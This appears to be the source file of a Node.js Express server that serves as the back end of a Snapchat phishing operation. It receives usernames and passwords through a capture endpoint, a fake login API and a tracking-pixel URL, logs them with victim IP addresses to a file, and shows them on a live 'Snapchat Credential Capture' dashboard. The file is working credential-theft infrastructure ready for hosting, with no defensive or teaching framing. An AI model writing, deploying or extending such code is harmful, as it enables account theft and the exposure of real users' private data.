const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// --- CONFIG ---
const LOG_FILE = path.join(__dirname, 'captured.log');

// --- MIDDLEWARE ---
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// --- LOGGING ---
function logCredentials(data) {
    const logEntry = {
        timestamp: new Date().toISOString(),
        ...data,
        ip: data.ip || 'unknown'
    };
    
    // Append to log file
    fs.appendFileSync(LOG_FILE, JSON.stringify(logEntry) + '\n');
    
    console.log(`[CAPTURED] ${data.username}:${data.password}`);
}

// --- CAPTURE ENDPOINTS ---
app.post('/capture', (req, res) => {
    const data = req.body;
    data.ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    logCredentials(data);
    res.status(200).json({ status: 'ok' });
});

app.post('/api/login', (req, res) => {
    const data = req.body;
    data.ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    logCredentials(data);
    res.status(200).json({ status: 'ok' });
});

app.get('/pixel', (req, res) => {
    const data = {
        username: req.query.u || 'unknown',
        password: req.query.p || 'unknown',
        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        timestamp: new Date().toISOString()
    };
    logCredentials(data);
    res.writeHead(200, {
        'Content-Type': 'image/gif',
        'Cache-Control': 'no-cache'
    });
    res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
});

// --- VIEW LOGS ---
app.get('/logs', (req, res) => {
    const auth = req.headers.authorization;
    if (auth !== 'Bearer YOUR_SECRET_TOKEN_HERE') {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    try {
        const logs = fs.readFileSync(LOG_FILE, 'utf8');
        const lines = logs.split('\n').filter(Boolean).map(line => JSON.parse(line));
        res.json({ count: lines.length, logs: lines });
    } catch(e) {
        res.json({ count: 0, logs: [] });
    }
});

// --- DASHBOARD ---
app.get('/dashboard', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Capture Dashboard</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #f5f5f5; }
                .log { border: 1px solid #ddd; padding: 10px; margin: 5px; background: white; border-radius: 5px; }
                .log b { color: #fffc00; }
                .time { color: #999; font-size: 12px; }
            </style>
        </head>
        <body>
            <h1>🔓 Snapchat Credential Capture</h1>
            <h3 id="count">Loading...</h3>
            <div id="logs"></div>
            <script>
                setInterval(() => {
                    fetch('/logs', { headers: { 'Authorization': 'Bearer YOUR_SECRET_TOKEN_HERE' } })
                    .then(r => r.json())
                    .then(data => {
                        document.getElementById('count').textContent = 'Total Captures: ' + data.count;
                        document.getElementById('logs').innerHTML = 
                            data.logs.slice(-30).reverse().map(l => 
                                '<div class="log"><b>' + l.username + '</b> : ' + l.password + 
                                ' <span class="time">' + l.timestamp + '</span></div>'
                            ).join('');
                    });
                }, 2000);
            </script>
        </body>
        </html>
    `);
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`[CAT] Server running on port ${PORT}`);
    console.log(`[CAT] Dashboard: https://your-app.onrender.com/dashboard`);
});